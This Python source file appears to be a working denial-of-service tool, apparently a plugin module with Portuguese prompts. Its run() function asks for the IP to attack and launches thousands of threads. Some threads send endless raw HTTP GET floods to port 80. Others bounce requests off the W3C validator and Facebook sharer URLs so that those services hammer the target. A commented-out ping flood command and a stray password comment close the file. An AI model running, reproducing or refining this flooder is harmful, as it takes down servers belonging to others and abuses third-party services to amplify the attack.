from os import system;
from queue import Queue;
import time, sys, socket, threading, logging, urllib.request, random;

def run(functions: dict) -> None:
	
	target = functions['selfInput']('Qual é o ip que eu irei dar ddos?\n');
	target = target.replace(' ', '');

	def user_agent():
		global uagent
		uagent=[]
		uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
		uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
		uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
		uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
		uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
		uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
		uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")

		return(uagent)
	def my_bots():
		global bots
		bots=[]
		bots.append("http://validator.w3.org/check?uri=")
		bots.append("http://www.facebook.com/sharer/sharer.php?u=")

		return(bots)
	
	def bot_hammering(url):
		try:
			while True:
				req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
				print("\033[94mbot is hammering...\033[0m")
				time.sleep(.1)

		except:
			time.sleep(.1)

	def down_it(item):
		try:
			while True:
				packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((host,int(port)))

				if s.sendto( packet, (host, int(port)) ):
					s.shutdown(1)
					print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")

				else:
					s.shutdown(1)
					print("\033[91mshut<->down\033[0m")

				time.sleep(.1)

		except socket.error as e:
			print("\033[91mno connection! server maybe down\033[0m")
			print("\033[91m",e,"\033[0m")
			time.sleep(.1)

	def dos():
		while True:
			item = q.get()
			down_it(item)
			q.task_done()
	
	def dos2():
		while True:
			item=w.get()
			bot_hammering(random.choice(bots)+"http://"+host)
			w.task_done()
	
	def get_parameters():
		global host
		global port
		global thr
		global item

		host = target
		port = 80
		thr = 6500

	global data
	headers = """Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Connection: keep-alive""";
	data = headers

	q = Queue()
	w = Queue()


	get_parameters()
	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
	print("\033[94mPlease wait...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)

	except socket.error as e:
		print("\033[91mcheck server ip and port\033[0m")

	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()

		item = 0
		while True:
			if (item > 1400): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()

	# senha sasuke - 0129
	# system(f'ping {target} -l 2000 -w 2000 -t -n 100000');